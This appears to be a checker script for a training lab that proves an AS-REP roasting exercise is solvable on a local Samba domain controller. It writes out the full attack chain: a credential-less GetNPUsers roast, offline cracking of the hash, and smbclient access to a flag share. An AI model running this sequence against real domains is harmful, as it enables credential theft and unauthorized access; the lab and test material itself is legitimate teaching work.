#!/bin/bash
# Proves the AS-REP roasting lab is correctly built and genuinely solvable, driven from inside the
# DC exactly as a student would from the attack box:
#   0. the intended misconfiguration is present: svc-scanner carries UF_DONT_REQUIRE_PREAUTH while
#      an ordinary account (l.nguyen) does not,
#   1. the real-world no-credential roast (impacket GetNPUsers -no-pass) returns svc-scanner's
#      $krb5asrep$ hash -- which works here because this DC runs Samba against the MIT KDC, which
#      honours UF_DONT_REQUIRE_PREAUTH (Debian's Heimdal-based Samba does not),
#   2. it is cracked offline against the wordlist (crack.py, the AES AS-REP this modern DC emits;
#      a student uses john --format=krb5asrep or nxc on the attack box) -> svc-scanner's password,
#   3. that password reads the imaging flag, which matches the one the DC planted.
# Negative control: the ordinary account cannot read the imaging share.
set -uo pipefail

REALM="LAKESIDE.LAB"
NOPREAUTH_USER="svc-scanner"
DECOY_USER="l.nguyen"
USERLIST="/opt/asrep/users.txt"
WORDLIST="/opt/asrep/wordlist.txt"
PY="/opt/impacket-venv/bin/python3"
GETNP="${PY} /opt/impacket-venv/bin/GetNPUsers.py"
CRACK="${PY} /opt/asrep/crack.py"
SAMLDB="/var/lib/samba/private/sam.ldb"
DC_IP="127.0.0.1"
PLANTED="/srv/imaging/flag.txt"
UF_DONT_REQ_PREAUTH=4194304  # 0x400000

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT
fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

uac_of() { ldbsearch -H "${SAMLDB}" "(samAccountName=$1)" userAccountControl 2>/dev/null \
             | awk -F': ' '/^userAccountControl:/{print $2; exit}'; }

echo "[0/4] verifying the misconfiguration: ${NOPREAUTH_USER} has DONT_REQ_PREAUTH, ${DECOY_USER} does not ..." >&2
NP_UAC="$(uac_of "${NOPREAUTH_USER}")"; DEC_UAC="$(uac_of "${DECOY_USER}")"
[ -n "${NP_UAC}" ] || fail "could not read ${NOPREAUTH_USER}'s userAccountControl"
(( (NP_UAC & UF_DONT_REQ_PREAUTH) != 0 )) || fail "${NOPREAUTH_USER} is missing UF_DONT_REQUIRE_PREAUTH (uac=${NP_UAC})"
(( (DEC_UAC & UF_DONT_REQ_PREAUTH) == 0 )) || fail "${DECOY_USER} unexpectedly has UF_DONT_REQUIRE_PREAUTH (uac=${DEC_UAC})"

echo "[1/4] AS-REP roasting the username list with no credentials (GetNPUsers -no-pass) ..." >&2
HASH="${WORK}/asrep.hash"
${GETNP} "${REALM}/" -usersfile "${USERLIST}" -no-pass -dc-ip "${DC_IP}" -format john \
  2>"${WORK}/getnp.err" | grep -E '^\$krb5asrep\$' > "${HASH}" || true
grep -q "${NOPREAUTH_USER}" "${HASH}" 2>/dev/null \
  || fail "no AS-REP hash obtained for ${NOPREAUTH_USER} ($(tr '\n' ' ' < "${WORK}/getnp.err" | cut -c1-200))"
# Keep only svc-scanner's line (the decoys produce none, but be explicit).
grep "${NOPREAUTH_USER}" "${HASH}" | head -1 > "${WORK}/svc.hash"
echo "      extracted: $(cut -c1-48 "${WORK}/svc.hash")..." >&2

echo "[2/4] cracking the AS-REP hash against the wordlist ..." >&2
CRACKED="$(${CRACK} "${WORK}/svc.hash" "${WORDLIST}" 2>/dev/null)"
[ -n "${CRACKED}" ] || fail "the wordlist did not recover ${NOPREAUTH_USER}'s password"
echo "      recovered ${NOPREAUTH_USER} password: ${CRACKED}" >&2

echo "[3/4] reading the imaging share as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
OUT="${WORK}/flag.out"
smbclient //dc/imaging -U "LAKESIDE\\${NOPREAUTH_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the imaging share as ${NOPREAUTH_USER}"
[ -s "${OUT}" ] || fail "imaging flag.txt came back empty"
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${NOPREAUTH_USER} does not match the planted flag"

# Negative control: the ordinary account must NOT be able to read the imaging share.
if smbclient //dc/imaging -U "LAKESIDE\\${DECOY_USER}%whatever" -c "ls" >/dev/null 2>&1; then
  fail "imaging share is readable by ${DECOY_USER}; the flag is not gated behind ${NOPREAUTH_USER}"
fi

echo "CHECK PASS: DONT_REQ_PREAUTH(${NOPREAUTH_USER}) -> AS-REP roast -> crack (${CRACKED}) -> flag $(cat "${OUT}")" >&2
echo "ASREP_OK"
